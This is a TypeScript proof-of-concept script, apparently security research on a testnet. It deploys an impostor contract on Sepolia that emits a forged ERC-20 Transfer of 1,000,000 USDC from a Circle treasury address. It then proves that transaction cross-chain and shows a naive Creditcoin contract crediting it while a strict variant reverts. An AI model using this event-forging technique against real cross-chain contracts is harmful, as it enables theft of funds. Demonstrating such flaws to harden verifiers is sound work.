/** Phase 0 probe 25 — EXPLOIT DEMO HALF TWO.
 *  Deploy an impostor on Sepolia that emits a common event signature, prove that real
 *  Sepolia transaction, and watch a naive ASC on CC3 credit it to a token it never touched. */
import { JsonRpcProvider, Wallet, ContractFactory, Contract, Interface, formatEther, keccak256, toUtf8Bytes } from 'ethers';
import { readFileSync, writeFileSync } from 'node:fs';
import { homedir } from 'node:os'; import { join } from 'node:path';
import { proofProvider, chainInfo } from '@gluwa/usc-sdk';

const CC3  = new JsonRpcProvider('https://rpc.cc3-testnet.creditcoin.network');
const SEP  = new JsonRpcProvider('https://ethereum-sepolia-rpc.publicnode.com');
const DECODER = '0x731c345d79Fb8BbDC541f9DF3b6317585F849F9f';
const ART = '../contracts/out';
const SEPOLIA_CHAIN_KEY = 1;
const SEPOLIA_USDC = '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238'; // what the ASC believes it watches
const CIRCLE_TREASURY = '0x55FE002aefF02F77364de339a1292923A15844B8'; // a name worth forging

const kf = JSON.parse(readFileSync(join(homedir(),'.config','creditcoin','arrears-testnet.json'),'utf8'));
const cc3w = new Wallet(kf.accounts.deployer.privateKey, CC3);
const sepw = new Wallet(kf.accounts.impostor.privateKey, SEP);

function load(name: string) {
  const a = JSON.parse(readFileSync(`${ART}/${name}.sol/${name}.json`, 'utf8'));
  const bc = a.bytecode.object.replace(/__\$[0-9a-f]{34}\$__/g, DECODER.slice(2).toLowerCase());
  if (/__\$/.test(bc)) throw new Error('unlinked');
  return { abi: a.abi, bytecode: bc };
}
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

async function main() {
  const out: any = {};
  console.log(`Sepolia signer ${sepw.address}  ${formatEther(await SEP.getBalance(sepw.address))} ETH`);

  // --- 1. deploy the impostor on Sepolia ---
  console.log('\n=== 1. deploy Impostor on Ethereum Sepolia ===');
  const imp = load('Impostor');
  const f = new ContractFactory(imp.abi, imp.bytecode, sepw);
  const c = await f.deploy();
  const drc = await c.deploymentTransaction()!.wait();
  const impAddr = await c.getAddress();
  console.log(`  Impostor ${impAddr}`);
  console.log(`  deploy gasUsed ${drc!.gasUsed} · tx ${drc!.hash}`);
  console.log(`  https://sepolia.etherscan.io/address/${impAddr}`);
  out.impostor = { address: impAddr, deployTx: drc!.hash, deployGas: Number(drc!.gasUsed) };

  // --- 2. forge a Transfer log ---
  console.log('\n=== 2. emit a forged ERC-20 Transfer ===');
  const AMOUNT = 1_000_000_000_000n; // 1,000,000 USDC at 6dp
  const ft = await (c as any).forge(CIRCLE_TREASURY, sepw.address, AMOUNT);
  const frc = await ft.wait();
  console.log(`  forge(from=${CIRCLE_TREASURY}, to=${sepw.address}, value=${AMOUNT})`);
  console.log(`  Sepolia tx ${frc.hash}  block ${frc.blockNumber}  logs ${frc.logs.length}`);
  console.log(`  emitted by ${frc.logs[0].address}  topic0 ${frc.logs[0].topics[0]}`);
  console.log(`  Transfer sig ${keccak256(toUtf8Bytes('Transfer(address,address,uint256)'))}`);
  console.log(`  https://sepolia.etherscan.io/tx/${frc.hash}`);
  out.forgeTx = { hash: frc.hash, block: frc.blockNumber, emitter: frc.logs[0].address, amount: AMOUNT.toString() };

  // --- 3. wait for Creditcoin to attest that Sepolia block ---
  console.log('\n=== 3. wait for CC3 to attest Sepolia block ' + frc.blockNumber + ' ===');
  const info = new chainInfo.PrecompileChainInfoProvider(CC3);
  for (let i = 0; i < 80; i++) {
    const tip = await info.getLatestAttestedHeightAndHash(SEPOLIA_CHAIN_KEY);
    if (tip.height >= frc.blockNumber) { console.log(`  attested (tip ${tip.height})`); break; }
    if (i % 4 === 0) console.log(`  tip ${tip.height}, need ${frc.blockNumber} — ${frc.blockNumber - tip.height} behind`);
    await sleep(15000);
  }

  // --- 4. prove the Sepolia transaction ---
  console.log('\n=== 4. prove the impostor transaction (chainKey 1) ===');
  const pb = new proofProvider.service.ProofBuilder(SEPOLIA_CHAIN_KEY, 'https://prover.cc3-testnet.creditcoin.network', 120000);
  let d: any = null;
  for (let i = 0; i < 20; i++) {
    const r = await pb.getProof(frc.hash);
    if (r.success) { d = r.data; break; }
    console.log(`  prover not ready, retry ${i+1}`); await sleep(15000);
  }
  if (!d) throw new Error('proof never became available');
  console.log(`  proven: height ${d.headerNumber} index ${d.txIndex} contRoots ${d.continuityProof.roots.length} txBytes ${(d.txBytes.length-2)/2}`);
  out.proof = { height: d.headerNumber, txIndex: d.txIndex, contRoots: d.continuityProof.roots.length };

  // --- 5. deploy a naive ASC that believes it watches Sepolia USDC ---
  console.log('\n=== 5. deploy NaiveEventASC watching Sepolia USDC ===');
  const ev = load('NaiveEventASC');
  const ef = new ContractFactory(ev.abi, ev.bytecode, cc3w);
  const ec = await ef.deploy(SEPOLIA_USDC);
  const erc = await ec.deploymentTransaction()!.wait();
  const evAddr = await ec.getAddress();
  console.log(`  NaiveEventASC ${evAddr}  expectedToken ${SEPOLIA_USDC} (real Sepolia USDC)`);
  console.log(`  deploy gasUsed ${erc!.gasUsed} · tx ${erc!.hash}`);
  out.asc = { address: evAddr, expectedToken: SEPOLIA_USDC, deployTx: erc!.hash, deployGas: Number(erc!.gasUsed) };

  // --- 6. the naive path accepts the impostor's event ---
  console.log('\n=== 6. submit the impostor proof to the naive ASC ===');
  const mp = [d.merkleProof.root, d.merkleProof.siblings.map((s:any)=>[s.hash,s.isLeft])];
  const cp = [d.continuityProof.lowerEndpointDigest, d.continuityProof.roots];
  const asc = new Contract(evAddr, ev.abi, cc3w);
  const iface = new Interface(ev.abi);
  const t = await asc.recordTransfer(SEPOLIA_CHAIN_KEY, d.headerNumber, d.txBytes, mp, cp, { gasLimit: 3_000_000 });
  const rc = await t.wait();
  let acc: any = null;
  for (const l of rc.logs) { try { const p = iface.parseLog(l as any); if (p?.name === 'TransferAccepted') acc = p; } catch {} }
  console.log(`  NAIVE recordTransfer -> status ${rc.status} gasUsed ${rc.gasUsed} tx ${rc.hash}`);
  if (acc) {
    console.log(`  TransferAccepted EMITTED:`);
    console.log(`    emitter            ${acc.args.emitter}   <- the impostor`);
    console.log(`    expectedToken      ${SEPOLIA_USDC}   <- what it thought it was watching`);
    console.log(`    emitterWasExpected ${acc.args.emitterWasExpected}`);
    console.log(`    from               ${acc.args.from}`);
    console.log(`    to                 ${acc.args.to}`);
    console.log(`    amount             ${acc.args.amount}`);
  }
  out.naive = { hash: rc.hash, status: rc.status, gasUsed: Number(rc.gasUsed),
    emitter: acc?.args.emitter, emitterWasExpected: acc?.args.emitterWasExpected,
    from: acc?.args.from, to: acc?.args.to, amount: acc?.args.amount?.toString() };

  // --- 7. the strict path rejects it ---
  console.log('\n=== 7. the same proof against the strict variant ===');
  try {
    const raw = await CC3.call({ to: evAddr, from: cc3w.address,
      data: iface.encodeFunctionData('strictRecordTransfer', [SEPOLIA_CHAIN_KEY, d.headerNumber, d.txBytes, mp, cp]) });
    console.log('  unexpectedly returned', raw);
  } catch (e: any) {
    const raw = e?.data ?? e?.info?.error?.data ?? e?.error?.data;
    try { const err = iface.parseError(raw);
      console.log(`  REVERTED ${err!.name}(${err!.args.map((a:any)=>a.toString()).join(', ')})`);
      out.strict = { error: `${err!.name}(${err!.args.map((a:any)=>a.toString()).join(', ')})` };
    } catch { console.log(`  REVERTED raw=${raw}`); out.strict = { raw }; }
  }
  writeFileSync('evidence/25-demo-b.json', JSON.stringify(out, null, 2));
  console.log(`\nCC3 ASC:  https://creditcoin-testnet.blockscout.com/address/${evAddr}`);
  console.log(`Sepolia:  https://sepolia.etherscan.io/address/${impAddr}`);
}
main().catch(e => { console.error('FATAL', e.message ?? e); process.exit(1); });
